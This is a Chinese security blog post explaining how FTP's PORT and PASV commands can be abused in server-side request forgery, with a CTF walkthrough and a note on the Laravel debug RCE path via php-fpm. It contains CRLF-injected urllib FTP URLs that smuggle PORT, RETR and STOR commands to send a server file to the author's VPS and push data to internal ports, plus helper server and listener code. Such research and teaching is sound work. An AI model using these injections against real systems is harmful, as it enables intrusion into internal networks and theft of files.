> 原文链接: https://www.anquanke.com//post/id/251517 


# FTP在ssrf中的应用


                                阅读量   
                                **16225**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t01bfc808b7dc2bb947.png)](https://p1.ssl.qhimg.com/t01bfc808b7dc2bb947.png)



## 前言

ssrf中常用的协议有http，gopher等。但http的用处也仅限于访问内网网页，在可以crlf的情况下才有可能扩大攻击范围。gopher协议比较特殊，有一些环境下支持此协议，如：curl；但还一些就不支持，如:urllib.request模块。

但最近的laravel框架爆出的rce吸引了我的注意力。此文中，在可使用的协议受到约束的条件下，他们选择使用ftp协议攻击php-fpm达到rce。出于此，笔者决定探究ftp协议在ssrf中都有哪些应用。



## ftp的两种模式

ftp协议是文件传输协议，其使用模式有两种：

1.主动模式这个模式下，客户端向服务端发送连接请求命令PORT a,a,a,a,b,c，其中a是客户端ipv4的地址，b和c记录了一个由客户端开放的端口(b×256)+c。随后服务端去连接这个客户端地址。连接成功后开始对文件的传输。但由于客户端会由于防火墙等原因，导致服务端无法连接。就需要另一个模式了。

2.被动模式这个模式下，客户端向服务端发送连接请求命令PASV，随后服务端返回一个类似于右边字符串的响应227 Entering passive mode (a,a,a,a,b,c).，告诉客户端连接对应的地址进行文件传输。

发现了吗？在上面的命令中a, b, c如果可以受到我们控制，不就可以达到ssrf的效果了吗？



## 对ftp server进行ssrf

在刚刚结束的starctf中，其中一题oh-my-bet便是用到了主动模式下的ftp进行ssrf，发送二进制数据至mongoDB更改数据库中数据。

以下是原题目中使用pyftpdlib模块搭建于内网中的ftp server。

```
# import logging
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
authorizer = DummyAuthorizer()
authorizer.add_user("fan", "root", ".",perm="elrafmwMT")
authorizer.add_anonymous(".")
handler = FTPHandler
handler.permit_foreign_addresses = True #&lt;-- 此句很重要，原因后说
handler.passive_ports = range(2000, 2030)
handler.authorizer = authorizer
# logging.basicConfig(level=logging.DEBUG) &lt;-- 在测试时加入此句方便dubug
server = FTPServer(("0.0.0.0", 8877), handler)
server.serve_forever()
```

除ftp server，还有一个存在于内网的mongoDB，储存flask-session的pickle序列化数据。以及一个内网mysql储存用户数据。最后是向公网开放的flask(还有一个内网redis，这里用不到)。

原题目中存在一个参数可控的urllib.request.urlopen(value)，且python版本3.6，存在crlf漏洞。题目最后要求rce，唯一有可能的点就是储存在mongoDB中的flask-session序列化数据。但如果使用http协议crlf传输mongoDB是不行的，会被mongoDB拒绝连接。gopher协议不支持。所以最终着眼于ftp协议。

本文为讲解ftp在ssrf中的应用，简化上面环境，假设ftp-server.py所在目录有以下文件。

[![](https://p3.ssl.qhimg.com/t017e3c9b36a59dfaed.png)](https://p3.ssl.qhimg.com/t017e3c9b36a59dfaed.png)

先在urllib中连接尝试读取文件。

[![](https://p0.ssl.qhimg.com/t017293cacc55963402.png)](https://p0.ssl.qhimg.com/t017293cacc55963402.png)

urllib在成功连接控制端口后，会发送url中的用户名与密码，因此可以在密码后crlf，注入其它命令。以下会发送ftp-server.py文件至自己vps的2333端口。ur.urlopen(“ftp://fan:root\r\nTYPE I\r\nCWD .\r\nPORT v,p,s,ip,9,29\r\nRETR ftp-server.py\r\n@172.17.0.1:8877/ftp-server.py”).read()

[![](https://p3.ssl.qhimg.com/t0156ec24e69db09e97.png)](https://p3.ssl.qhimg.com/t0156ec24e69db09e97.png)

既然都可以上传至自己vps上的指定端口，那么就可以将其改为内网的任意ip与端口。

ip可控，接下来就是如何控制内容了。

正常情况下，单凭urlopen是无法上传文件的，但因为有crlf，我们可以轻易上传文件。以下链接告诉服务器：从自己vps的2333端口获取test文件，保存ur.urlopen(“ftp://fan:root\r\nTYPE I\r\nCWD .\r\nPORT v,p,s,ip,9,29\r\nSTOR test\r\n@172.17.0.1:8877/”).read()

这里简单写一个socket监听。

```
import socket
s = socket.socket()
s.bind(("0.0.0.0", 2333))
s.listen()
c, a = s.accept()
print(a)
c.send(b'\x02\x03\x03')
c.close()
s.close()
```

[![](https://p2.ssl.qhimg.com/t016fdd113df38a2e0a.png)](https://p2.ssl.qhimg.com/t016fdd113df38a2e0a.png)

成功上传。

上面是通过ftp server进行ssrf，但真实情况下就不太可能出现了。这种攻击被称为FTP bounce attack，有一定的年头了。现在的ftp server都会禁止这一行为。但在此题中handler.permit_foreign_addresses = True，让这种操作变为可能。



## 对ftp clinet进行ssrf

回到刚才说的laravel debug rce。

根据暴露此漏洞的原文。在模块中有以下抽象过的代码。

```
$data = file_get_contents($file);
file_put_contents($file, $data);
```

文章首先给出的方法是利用php://清空log文件，然后写入phar数据，使用phar协议反序列化。但还有一个方法，文章没有细说，就是使用ftp攻击php-fpm。

那么具体思路如下：

1.php从我们的ftp server获取payload，存入变量。

2.php上传文件时，将被动模式的连接地址改为内网地址，payload攻击。

我们先看一看php的file类函数是如何发送ftp请求的。依然是利用上面pyftpdlib模块的脚本开启ftp服务。在命令行使用：

```
php -r '$data = file_get_contents(\'ftp://fan:root@127.0.0.1:8877/test\');file_put_contents(\'ftp://fan:root@127.0.0.1:8877/test\', $data);'
```

查看ftp服务日志。(这里仅列出关键信息)

```
; php获取文件
DEBUG:pyftpdlib:127.0.0.1:18486-[] -&gt; 220 pyftpdlib 1.5.6 ready.
DEBUG:pyftpdlib:127.0.0.1:18486-[] &lt;- USER fan
DEBUG:pyftpdlib:127.0.0.1:18486-[] -&gt; 331 Username ok, send password.
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] &lt;- PASS ******
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] -&gt; 230 Login successful.
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] &lt;- TYPE I
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] -&gt; 200 Type set to: Binary.
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] &lt;- SIZE /test
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] -&gt; 213 4
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] &lt;- EPSV
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] -&gt; 500 'EPSV': command not understood.
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] &lt;- PASV
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] -&gt; 227 Entering passive mode (127,0,0,1,35,40).
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] &lt;- RETR /test
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] -&gt; 150 File status okay. About to open data connection.
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] -&gt; 226 Transfer complete.
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] &lt;- QUIT
DEBUG:pyftpdlib:127.0.0.1:18486-[fan] -&gt; 221 Goodbye.
; php上传文件
DEBUG:pyftpdlib:127.0.0.1:18488-[] -&gt; 220 pyftpdlib 1.5.6 ready.
DEBUG:pyftpdlib:127.0.0.1:18488-[] &lt;- USER fan
DEBUG:pyftpdlib:127.0.0.1:18488-[] -&gt; 331 Username ok, send password.
DEBUG:pyftpdlib:127.0.0.1:18488-[fan] &lt;- PASS ******
DEBUG:pyftpdlib:127.0.0.1:18488-[fan] -&gt; 230 Login successful.
DEBUG:pyftpdlib:127.0.0.1:18488-[fan] &lt;- TYPE I
DEBUG:pyftpdlib:127.0.0.1:18488-[fan] -&gt; 200 Type set to: Binary.
DEBUG:pyftpdlib:127.0.0.1:18488-[fan] &lt;- SIZE /test
DEBUG:pyftpdlib:127.0.0.1:18488-[fan] -&gt; 213 4
```

这里，php先使用SIZE命令确认文件是否存在，然后使用了EPSV命令，这个命令是启用扩展被动模式。ftp server将指返回端口，不返回ip。解决方法很简单，找一个不支持这个扩展的服务器就行。(这里笔者是修改了pyftpdlib的源码)

综合上面信息，有两个难点：

1.获取和上传的是同一个文件，file_put_contents会检测文件是否存在，如果存在则不会进行上传操作。因此需要在获取文件后的瞬间删除该文件。

2.一般ftp client都使用被动模式。php获取文件时，要求被动模式返回服务器自己的地址。但php上传文件时，返回的却是内网地址。

很明显，上面的问题套用一般的轮子很难解决。这里虽然可以尝试利用hook之类的技术实现类似效果，但因为ftp协议本身的交互没有那么复杂。所以笔者决定做一个fake ftp(已开源)。

这里尝试将一个test字符串从外网，通过php的ftp client发送至内网的2333端口。

效果如下：

[![](https://p2.ssl.qhimg.com/t0183fab53b74ea10b0.png)](https://p2.ssl.qhimg.com/t0183fab53b74ea10b0.png)

[![](https://p2.ssl.qhimg.com/t01b6c61d652bdd740d.png)](https://p2.ssl.qhimg.com/t01b6c61d652bdd740d.png)

[![](https://p3.ssl.qhimg.com/t0159c068a08734ddc2.png)](https://p3.ssl.qhimg.com/t0159c068a08734ddc2.png)



## 总结

ftp可以在ssrf中起到作用，其原因便是PORT和PASV两个命令导致的连接跳转。把握此点，便可使ftp在漏洞利用中大放异彩！一个老掉牙的ftp协议，在如今也可以返回人们的视野。告诫我们不要忽视那些细节，可能那些细节便是一个突破口。
